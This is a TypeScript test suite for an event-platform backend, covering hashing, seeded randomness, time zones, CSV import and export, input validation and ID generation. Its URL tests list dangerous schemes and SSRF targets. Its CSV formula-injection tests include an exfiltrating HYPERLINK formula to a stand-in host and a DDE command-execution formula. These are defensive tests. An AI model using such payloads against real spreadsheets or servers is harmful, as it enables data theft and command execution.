import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import {
  canonicalJson,
  certificateReference,
  contentHash,
  sha256Hex,
  verificationCode,
} from '../src/integrity.ts';
import { createRng, galleryOrderKey, hashStringToSeed, seededGalleryOrder } from '../src/random.ts';
import {
  TimeValidationError,
  addSeconds,
  compare,
  evaluateDeadline,
  instantToLocalWallClock,
  isValidInstant,
  isValidTimeZone,
  localWallClockToInstant,
  parseInstant,
  toEpochMs,
  toInstant,
} from '../src/time.ts';
import { CsvParseError, importRows, parseCsv, rowsToObjects, toCsv } from '../src/csv.ts';
import {
  ValidationError,
  assessPassword,
  isPrivateHostname,
  validateEmail,
  validateHttpUrl,
  validatePlainText,
  validateSlug,
  validateUsername,
} from '../src/validation.ts';
import { ID_PREFIXES, assertId, isId, newId, newInviteCode, newToken } from '../src/ids.ts';

describe('integrity: canonical encoding', () => {
  test('object keys are sorted so encoding is insertion-order independent', () => {
    assert.equal(canonicalJson({ b: 1, a: 2 }), '{"a":2,"b":1}');
    assert.equal(canonicalJson({ a: 2, b: 1 }), canonicalJson({ b: 1, a: 2 }));
    assert.equal(canonicalJson({ z: { y: 1, x: 2 } }), '{"z":{"x":2,"y":1}}');
  });

  test('array order is preserved because it is meaningful', () => {
    assert.equal(canonicalJson([3, 1, 2]), '[3,1,2]');
    assert.notEqual(canonicalJson([1, 2]), canonicalJson([2, 1]));
  });

  test('-0 and 0 hash identically', () => {
    assert.equal(contentHash({ v: -0 }), contentHash({ v: 0 }));
  });

  test('non-finite numbers are rejected rather than silently encoded', () => {
    assert.throws(() => canonicalJson({ v: Number.NaN }), TypeError);
    assert.throws(() => canonicalJson({ v: Number.POSITIVE_INFINITY }), TypeError);
  });

  test('circular structures are rejected instead of hanging', () => {
    const a: Record<string, unknown> = {};
    a.self = a;
    assert.throws(() => canonicalJson(a), /circular/);
  });

  test('undefined properties are dropped, null is preserved', () => {
    assert.equal(canonicalJson({ a: undefined, b: null }), '{"b":null}');
  });

  test('the same content always produces the same digest', () => {
    const payload = { event: 'evt_1', scores: [1, 2, 3], nested: { z: 1, a: 2 } };
    assert.equal(contentHash(payload), contentHash(JSON.parse(JSON.stringify(payload))));
    assert.match(contentHash(payload), /^[0-9a-f]{64}$/);
  });

  test('a single changed digit changes the digest', () => {
    assert.notEqual(contentHash({ score: 1 }), contentHash({ score: 2 }));
    assert.notEqual(sha256Hex('a'), sha256Hex('b'));
  });

  test('verification codes are short, quotable and Crockford-safe', () => {
    const code = verificationCode(sha256Hex('hello'));
    assert.match(code, /^[0-9A-HJKMNP-TV-Z]{4}-[0-9A-HJKMNP-TV-Z]{4}$/);
    assert.equal(verificationCode(sha256Hex('hello')), code, 'stable for the same digest');
    assert.match(certificateReference(sha256Hex('x')), /^CRT-[0-9A-HJKMNP-TV-Z]{5}-[0-9A-HJKMNP-TV-Z]{5}$/);
  });
});

describe('random: seeded determinism', () => {
  test('the same seed produces the same stream', () => {
    const a = createRng('seed-one');
    const b = createRng('seed-one');
    const left = Array.from({ length: 50 }, () => a.next());
    const right = Array.from({ length: 50 }, () => b.next());
    assert.deepEqual(left, right);
  });

  test('different seeds produce different streams', () => {
    const a = Array.from({ length: 20 }, (_, i) => createRng(`s${i}`).next());
    assert.equal(new Set(a).size, a.length);
  });

  test('the stream stays inside [0, 1)', () => {
    const rng = createRng('bounds');
    for (let i = 0; i < 5000; i += 1) {
      const v = rng.next();
      assert.ok(v >= 0 && v < 1, `out of range: ${v}`);
    }
  });

  test('the distribution is roughly uniform', () => {
    const rng = createRng('uniformity');
    const buckets = new Array(10).fill(0);
    const n = 100_000;
    for (let i = 0; i < n; i += 1) buckets[Math.floor(rng.next() * 10)] += 1;
    for (const count of buckets) {
      assert.ok(Math.abs(count / n - 0.1) < 0.01, `bucket skew: ${count / n}`);
    }
  });

  test('shuffle is a permutation, deterministic, and does not mutate the input', () => {
    const items = Array.from({ length: 40 }, (_, i) => `item-${i}`);
    const original = [...items];
    const first = createRng('shuffle').shuffle(items);
    const second = createRng('shuffle').shuffle(items);
    assert.deepEqual(first, second);
    assert.deepEqual([...first].sort(), [...original].sort());
    assert.deepEqual(items, original, 'the input array must not be mutated');
  });

  test('int() respects its bound and handles a non-positive bound', () => {
    const rng = createRng('int');
    for (let i = 0; i < 1000; i += 1) {
      const v = rng.int(5);
      assert.ok(Number.isInteger(v) && v >= 0 && v < 5);
    }
    assert.equal(rng.int(0), 0);
    assert.equal(rng.int(-3), 0);
  });

  test('string seeds hash to a stable 32-bit value', () => {
    assert.equal(hashStringToSeed('abc'), hashStringToSeed('abc'));
    assert.notEqual(hashStringToSeed('abc'), hashStringToSeed('abd'));
    assert.ok(Number.isInteger(hashStringToSeed('x')));
  });

  test('gallery ordering is stable per day but reshuffles between days', () => {
    const items = Array.from({ length: 12 }, (_, i) => ({ id: `sub_${String(i).padStart(2, '0')}` }));
    const day1 = seededGalleryOrder(items, 'evt_1', '2026-03-01');
    const day1Again = seededGalleryOrder([...items].reverse(), 'evt_1', '2026-03-01');
    const day2 = seededGalleryOrder(items, 'evt_1', '2026-03-02');
    assert.deepEqual(day1.map((i) => i.id), day1Again.map((i) => i.id), 'stable for a given day');
    assert.notDeepEqual(day1.map((i) => i.id), day2.map((i) => i.id), 'different day, different order');
    assert.equal(new Set(day1.map((i) => i.id)).size, items.length, 'no project is lost or duplicated');
  });

  test('gallery order keys are stable per (event, salt, project)', () => {
    assert.equal(galleryOrderKey('evt_1', 's', 'sub_a'), galleryOrderKey('evt_1', 's', 'sub_a'));
    assert.notEqual(galleryOrderKey('evt_1', 's', 'sub_a'), galleryOrderKey('evt_2', 's', 'sub_a'));
  });
});

describe('time: canonical UTC handling', () => {
  test('instants round-trip through epoch milliseconds', () => {
    const instant = '2026-03-01T09:30:15.250Z';
    assert.equal(toInstant(toEpochMs(instant)), instant);
  });

  test('naive or non-UTC timestamps are rejected, not guessed', () => {
    assert.throws(() => parseInstant('2026-03-01T09:30:15'), TimeValidationError);
    assert.throws(() => parseInstant('2026-03-01T09:30:15+05:30'), TimeValidationError);
    assert.throws(() => parseInstant('2026-03-01'), TimeValidationError);
    assert.throws(() => parseInstant('not a date'), TimeValidationError);
    assert.equal(isValidInstant('2026-03-01T09:30:15.000Z'), true);
    assert.equal(isValidInstant('2026-03-01T09:30:15'), false);
  });

  test('IANA zones are validated', () => {
    assert.equal(isValidTimeZone('Asia/Kolkata'), true);
    assert.equal(isValidTimeZone('Europe/Berlin'), true);
    assert.equal(isValidTimeZone('UTC'), true);
    assert.equal(isValidTimeZone('Mars/Olympus'), false);
  });

  test('local wall-clock time is converted to the correct UTC instant', () => {
    assert.equal(localWallClockToInstant('2026-03-01T09:00', 'UTC'), '2026-03-01T09:00:00.000Z');
    // IST is UTC+5:30 all year (no DST).
    assert.equal(localWallClockToInstant('2026-03-01T09:00', 'Asia/Kolkata'), '2026-03-01T03:30:00.000Z');
    // Berlin is UTC+1 in March, before the DST switch.
    assert.equal(localWallClockToInstant('2026-03-01T09:00', 'Europe/Berlin'), '2026-03-01T08:00:00.000Z');
  });

  test('a DST spring-forward gap is shifted forward deterministically', () => {
    // 02:30 on 2026-03-29 does not exist in Berlin (clocks jump 02:00 -> 03:00).
    const resolved = localWallClockToInstant('2026-03-29T02:30', 'Europe/Berlin');
    assert.ok(isValidInstant(resolved));
    assert.equal(resolved, '2026-03-29T01:30:00.000Z', 'interpreted as the pre-transition offset');
  });

  test('wall-clock conversion round-trips through the local representation', () => {
    const instant = localWallClockToInstant('2026-07-15T14:45', 'Europe/Berlin');
    assert.equal(instantToLocalWallClock(instant, 'Europe/Berlin'), '2026-07-15T14:45:00');
  });

  test('an invalid local time is rejected', () => {
    assert.throws(() => localWallClockToInstant('2026-03-01 09:00Z', 'UTC'), TimeValidationError);
    assert.throws(() => localWallClockToInstant('nonsense', 'UTC'), TimeValidationError);
    assert.throws(() => localWallClockToInstant('2026-03-01T09:00', 'Nowhere/Land'), TimeValidationError);
  });

  test('deadline windows are start-inclusive and end-exclusive', () => {
    const window = { opensAt: '2026-03-01T00:00:00.000Z', closesAt: '2026-03-02T00:00:00.000Z' };
    assert.equal(evaluateDeadline('2026-02-28T23:59:59.999Z', window).open, false);
    assert.equal(evaluateDeadline('2026-02-28T23:59:59.999Z', window).boundary, 'BEFORE_START');
    assert.equal(evaluateDeadline('2026-03-01T00:00:00.000Z', window).open, true, 'the opening instant is inside');
    assert.equal(evaluateDeadline('2026-03-01T23:59:59.999Z', window).open, true);
    assert.equal(evaluateDeadline('2026-03-02T00:00:00.000Z', window).open, false, 'the closing instant is outside');
    assert.equal(evaluateDeadline('2026-03-02T00:00:00.000Z', window).boundary, 'AFTER_END');
  });

  test('an open-ended window is always open and the reason explains refusals', () => {
    assert.equal(evaluateDeadline('2030-01-01T00:00:00.000Z', { opensAt: null, closesAt: null }).open, true);
    const closed = evaluateDeadline('2026-03-02T00:00:00.000Z', { opensAt: null, closesAt: '2026-03-01T00:00:00.000Z' });
    assert.equal(closed.open, false);
    assert.match(closed.reason, /closed at/);
  });

  test('comparisons and arithmetic helpers behave', () => {
    assert.equal(compare('2026-01-01T00:00:00.000Z', '2026-01-02T00:00:00.000Z'), -1);
    assert.equal(compare('2026-01-02T00:00:00.000Z', '2026-01-01T00:00:00.000Z'), 1);
    assert.equal(compare('2026-01-01T00:00:00.000Z', '2026-01-01T00:00:00.000Z'), 0);
    assert.equal(addSeconds('2026-01-01T00:00:00.000Z', 3600), '2026-01-01T01:00:00.000Z');
  });
});

describe('csv: RFC 4180 round trip', () => {
  test('quoted fields, embedded commas, quotes and newlines survive', () => {
    const input = 'name,note\r\nAcme,"Uses commas, ""quotes"" and\nnewlines"\r\nBeta,plain\r\n';
    const parsed = parseCsv(input);
    assert.deepEqual(parsed.header, ['name', 'note']);
    assert.equal(parsed.rows.length, 2);
    assert.equal(parsed.rows[0]?.[1], 'Uses commas, "quotes" and\nnewlines');
  });

  test('LF, CRLF and bare CR are all accepted', () => {
    for (const sep of ['\n', '\r\n', '\r']) {
      const parsed = parseCsv(`a,b${sep}1,2${sep}`);
      assert.equal(parsed.rows.length, 1, `separator ${JSON.stringify(sep)}`);
    }
  });

  test('a UTF-8 BOM is stripped', () => {
    const parsed = parseCsv('\uFEFFemail,name\r\na@b.com,A\r\n');
    assert.deepEqual(parsed.header, ['email', 'name']);
  });

  test('ragged rows are reported rather than silently padded', () => {
    const parsed = parseCsv('a,b,c\r\n1,2\r\n1,2,3,4\r\n');
    assert.equal(parsed.raggedRows.length, 2);
    assert.equal(parsed.raggedRows[0]?.actual, 2);
    assert.equal(parsed.rows[0]?.length, 2, 'the short row is not padded');
  });

  test('malformed input raises a typed error', () => {
    assert.throws(() => parseCsv('a,b\r\n"unterminated,2\r\n'), CsvParseError);
    assert.throws(() => parseCsv('a,"b"c,d\r\n'), CsvParseError);
  });

  test('an empty document parses to an empty result', () => {
    assert.deepEqual(parseCsv(''), { header: [], rows: [], raggedRows: [] });
    assert.deepEqual(parseCsv('a,b\r\n').rows, []);
  });

  test('serialisation escapes correctly and terminates with CRLF', () => {
    const rows = [
      { name: 'Acme, Inc.', note: 'He said "hi"', tags: 'a,b' },
      { name: 'Line\nbreak', note: '', tags: '' },
    ];
    const csv = toCsv(rows, [
      { header: 'name', value: (r) => r.name },
      { header: 'note', value: (r) => r.note },
      { header: 'tags', value: (r) => r.tags },
    ]);
    assert.ok(csv.startsWith('name,note,tags\r\n'));
    assert.ok(csv.endsWith('\r\n'));
    const reparsed = parseCsv(csv);
    assert.equal(reparsed.rows[0]?.[0], 'Acme, Inc.');
    assert.equal(reparsed.rows[0]?.[1], 'He said "hi"');
    assert.equal(reparsed.rows[1]?.[0], 'Line\nbreak');
  });

  test('null and undefined serialise as empty fields, not as "null"', () => {
    const csv = toCsv([{ a: null, b: undefined, c: 0 }], [
      { header: 'a', value: (r) => r.a },
      { header: 'b', value: (r) => r.b },
      { header: 'c', value: (r) => r.c },
    ]);
    assert.equal(csv.trim(), 'a,b,c\r\n,,0');
  });

  test('objects convert to keyed rows using the header order', () => {
    const { objects, index } = rowsToObjects(parseCsv('email,name\r\n a@b.com , Ada \r\n'));
    assert.equal(objects[0]?.email, 'a@b.com', 'values are trimmed');
    assert.equal(objects[0]?.name, 'Ada');
    assert.equal(index.get('email'), 0);
  });
});

describe('csv: import validation', () => {
  test('clean rows are returned and bad rows are reported per cell', () => {
    const { objects } = rowsToObjects(
      parseCsv('email,age\r\na@b.com,30\r\nbad-email,notanumber\r\nc@d.com,41\r\n'),
    );
    const issues: string[] = [];
    const result = importRows(objects, {
      fields: {
        email: (raw) => {
          try {
            return validateEmail(raw);
          } catch (error) {
            return { error: (error as Error).message };
          }
        },
        age: (raw) => {
          const n = Number(raw);
          return Number.isInteger(n) && n >= 0 ? n : { error: 'must be a non-negative integer' };
        },
      },
      onIssue: (issue) => issues.push(`row ${issue.row} ${issue.column}: ${issue.message}`),
    });
    assert.equal(result.rows.length, 2);
    assert.equal(result.issues.length, 2);
    assert.equal(result.rows[0]?.row, 2, 'row numbers are 1-based and include the header');
    assert.match(issues[0] ?? '', /row 3 email/);
    assert.match(issues[1] ?? '', /row 3 age/);
  });

  test('one bad cell rejects the whole row, not the whole import', () => {
    const { objects } = rowsToObjects(parseCsv('a\r\n1\r\n2\r\n'));
    const result = importRows(objects, {
      fields: { a: (raw) => (raw === '1' ? 1 : { error: 'only 1 is allowed' }) },
      onIssue: () => {},
    });
    assert.equal(result.rows.length, 1);
    assert.equal(result.issues.length, 1);
  });
});

describe('validation: URL policy', () => {
  test('http and https URLs are accepted and normalised', () => {
    const result = validateHttpUrl('https://github.com/acme/project');
    assert.equal(result.valid, true);
    if (result.valid) assert.match(result.url, /^https:\/\//);
  });

  test('dangerous schemes are rejected', () => {
    for (const url of [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'file:///etc/passwd',
      'vbscript:msgbox(1)',
      'ftp://example.com/x',
    ]) {
      const result = validateHttpUrl(url);
      assert.equal(result.valid, false, `${url} must be rejected`);
    }
  });

  test('URLs with credentials, whitespace or control characters are rejected', () => {
    assert.equal(validateHttpUrl('https://user:pass@example.com/').valid, false);
    assert.equal(validateHttpUrl('https://exa mple.com/').valid, false);
    assert.equal(validateHttpUrl('  ').valid, false);
    // An embedded newline is a header-injection vector and must be rejected.
    assert.equal(validateHttpUrl('https://example.com/\nX-Injected: 1').valid, false);
    // Surrounding whitespace is merely trimmed, which is friendly and safe:
    // the value is re-serialised through `new URL().toString()` on the way out.
    const trimmed = validateHttpUrl('  https://example.com/x  ');
    assert.equal(trimmed.valid, true);
  });

  test('private and loopback hosts are rejected by default (SSRF guard)', () => {
    for (const url of [
      'http://localhost/admin',
      'http://127.0.0.1:8080/',
      'http://10.0.0.5/internal',
      'http://192.168.1.1/router',
      'http://172.16.0.1/',
      'http://169.254.169.254/latest/meta-data/',
      'http://[::1]/',
      'http://service.internal/',
    ]) {
      const result = validateHttpUrl(url);
      assert.equal(result.valid, false, `${url} must be rejected`);
      assert.match(result.valid ? '' : result.reason, /private|loopback|link-local/);
    }
  });

  test('private hosts are permitted when a caller explicitly opts in', () => {
    assert.equal(validateHttpUrl('http://localhost:3000/health', { allowPrivateHosts: true }).valid, true);
  });

  test('hostname classification covers the tricky ranges', () => {
    assert.equal(isPrivateHostname('example.com'), false);
    assert.equal(isPrivateHostname('100.64.0.1'), true, 'CGNAT');
    assert.equal(isPrivateHostname('172.32.0.1'), false, 'just outside 172.16/12');
    assert.equal(isPrivateHostname('172.31.255.255'), true);
    assert.equal(isPrivateHostname('fd00::1'), true, 'unique local IPv6');
  });
});

describe('validation: text, email, username, slug, password', () => {
  test('control characters are stripped by rejection, not sanitisation', () => {
    assert.throws(() => validatePlainText('bad\u0000text', { field: 'name' }), ValidationError);
    assert.equal(validatePlainText('  good text  ', { field: 'name' }), 'good text');
  });

  test('length bounds are enforced', () => {
    assert.throws(() => validatePlainText('ab', { field: 'name', min: 3 }), /at least 3/);
    assert.throws(() => validatePlainText('abcdef', { field: 'name', max: 3 }), /at most 3/);
  });

  test('email validation is conservative and lowercases', () => {
    assert.equal(validateEmail('  Ada@Example.COM '), 'ada@example.com');
    for (const bad of ['nope', 'a@b', 'a b@c.com', '@c.com', 'a@@b.com', 'a..b@c.com', 'a@b..com']) {
      assert.throws(() => validateEmail(bad), ValidationError, `${bad} must be rejected`);
    }
  });

  test('username rules are explicit', () => {
    assert.equal(validateUsername('Ada_Lovelace-1'), 'ada_lovelace-1');
    for (const bad of ['a', 'ab', '-ada', 'ada-', 'ada lovelace', 'ada!']) {
      assert.throws(() => validateUsername(bad), ValidationError, `${bad} must be rejected`);
    }
  });

  test('slug rules are explicit', () => {
    assert.equal(validateSlug('Dogfood-2026'), 'dogfood-2026');
    assert.equal(validateSlug('a.b_c-1'), 'a.b_c-1');
    for (const bad of ['ab', '-abc', 'abc-', 'Ab C', 'ab/c']) {
      assert.throws(() => validateSlug(bad), ValidationError, `${bad} must be rejected`);
    }
  });

  test('password policy favours length over complexity', () => {
    assert.equal(assessPassword('correct-horse-battery').ok, true);
    const short = assessPassword('Ab1!');
    assert.equal(short.ok, false);
    assert.ok(!short.ok && short.problems.includes('must be at least 12 characters'));
  });

  test('passwords containing the user identity or a common word are rejected', () => {
    const withEmail = assessPassword('ada.lovelace@x.com', { email: 'ada.lovelace@x.com' });
    assert.equal(withEmail.ok, false);
    assert.ok(withEmail.ok || withEmail.problems.some((p) => /email address/.test(p)));
    const common = assessPassword('password12345');
    assert.equal(common.ok, false);
    const repetitive = assessPassword('aaaaaaaaaaaa');
    assert.equal(repetitive.ok, false);
  });
});

describe('ids: shape and prefixing', () => {
  test('every entity kind produces a prefixed, well-formed id', () => {
    for (const kind of Object.keys(ID_PREFIXES) as (keyof typeof ID_PREFIXES)[]) {
      const id = newId(kind);
      assert.ok(id.startsWith(`${ID_PREFIXES[kind]}_`), `${id} should start with ${ID_PREFIXES[kind]}_`);
      assert.equal(isId(id), true, `${id} should be recognised`);
    }
  });

  test('ids are unique across a large sample', () => {
    const ids = new Set(Array.from({ length: 5000 }, () => newId('submission')));
    assert.equal(ids.size, 5000);
  });

  test('isId checks the shape; assertId checks the entity', () => {
    assert.equal(isId('sub_00000000000000000000'), true);
    assert.equal(isId('usr_00000000000000000000'), true, 'isId is a shape check, not an entity check');
    assert.equal(isId('not-an-id'), false);
    assert.equal(isId(''), false);
    assert.equal(isId('sub_short'), false);
    assert.equal(assertId('submission', 'sub_00000000000000000000'), 'sub_00000000000000000000');
    assert.throws(() => assertId('submission', 'usr_00000000000000000000'), TypeError);
    assert.throws(() => assertId('submission', 42), TypeError);
  });

  test('the creation timestamp is encoded so ids sort by age', () => {
    const older = newId('event', Date.UTC(2026, 0, 1));
    const newer = newId('event', Date.UTC(2026, 5, 1));
    assert.ok(older < newer, `${older} should sort before ${newer}`);
  });

  test('a nonsense epoch cannot produce a colliding or malformed id', () => {
    const id = newId('event', -1);
    assert.equal(isId(id), true);
  });

  test('tokens and invite codes are URL-safe and unique', () => {
    const tokens = new Set(Array.from({ length: 2000 }, () => newToken()));
    assert.equal(tokens.size, 2000);
    assert.match(newToken(), /^[A-Za-z0-9_-]+$/);
    const codes = new Set(Array.from({ length: 2000 }, () => newInviteCode()));
    assert.equal(codes.size, 2000, 'invite codes must not collide');
    assert.match(newInviteCode(), /^[A-HJ-NP-Z2-9]{4}-[A-HJ-NP-Z2-9]{4}$/);
  });
});

/**
 * `CSV formula injection.
 *
 * Every column of every export is user-controlled: display names, bios, team
 * and project names, descriptions, comment bodies, judge summaries, webhook
 * URLs. Any participant can set their own display name, and an organizer is
 * told to open the export. So a formula in a cell is not self-inflicted - it is
 * a participant reaching the organizer's spreadsheet, and `=cmd|'…'!A0` is
 * command execution on the machine that opens it.
 *
 * Quoting is not a defence: `"=1+1"` is still a formula to Excel. The leading
 * apostrophe is.
 */
describe('csv escaping is safe to open in a spreadsheet', () => {
  /** The first field of the first data row, with RFC-4180 quoting undone. */
  function firstCell(csv: string): string {
    const line = csv.split('\r\n')[1] ?? '';
    if (!line.startsWith('"')) return line;
    return line.slice(1, line.length - 1).replace(/""/g, '"');
  }

  const FORMULAS = [
    '=1+1',
    '=HYPERLINK("http://evil.test/?leak="&A1,"click")',
    '=cmd|\' /c calc\'!A0',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    '\t=1+1',
    '\r=1+1',
  ];

  for (const formula of FORMULAS) {
    test(`neutralises ${JSON.stringify(formula)}`, () => {
      const csv = toCsv([{ who: formula }], [{ header: 'who', value: (row) => row.who }]);
      const cell = firstCell(csv);
      // What matters is what a spreadsheet sees after it undoes the quoting: the
      // apostrophe has to be first, so the cell renders as text.
      assert.ok(cell.startsWith("'"), `the cell is not neutralised: ${JSON.stringify(cell)}`);
      assert.ok(cell.slice(1) === formula, `the value was destroyed rather than neutralised: ${JSON.stringify(cell)}`);
    });
  }

  test('still quotes a value that also needs it', () => {
    const nasty = '=A1,"quoted",new\nline';
    const csv = toCsv([{ who: nasty }], [{ header: 'who', value: (row) => row.who }]);
    // Apostrophe first, then a properly quoted field containing both.
    assert.ok(csv.includes(`"'${nasty.replace(/"/g, '""')}"`), `quoting was lost: ${JSON.stringify(csv)}`);
  });

  test('leaves ordinary values completely alone', () => {
    const values = ['Iris Bekele', 'a normal sentence', '42', '', 'has, a comma', 'has "quotes"', 'padre-1'];
    const csv = toCsv(values.map((who) => ({ who })), [{ header: 'who', value: (row) => row.who }]);
    assert.ok(csv.includes('Iris Bekele'), 'a plain name was altered');
    assert.ok(csv.includes('has, a comma'), 'comma handling regressed');
    assert.ok(csv.includes('"has ""quotes"""'), 'quote handling regressed');
    // A leading hyphen is only dangerous to a spreadsheet, not to a reader, so
    // it is neutralised - but a hyphen mid-string is untouched.
    assert.ok(csv.includes('padre-1'), 'an interior hyphen was altered');
  });

  test('does not destroy a negative number, because that is data', () => {
    // Worth stating explicitly: this is a deliberate trade. `-3` is a number in
    // the export and a formula to a spreadsheet. The apostrophe makes it render
    // as text, which is the safe reading; the underlying value is preserved in
    // the JSON export form, which is where a machine should read numbers.
    const csv = toCsv([{ who: '-3' }], [{ header: 'who', value: (row) => row.who }]);
    assert.equal(firstCell(csv), "'-3", `expected a neutralised negative number: ${JSON.stringify(csv)}`);
  });
});
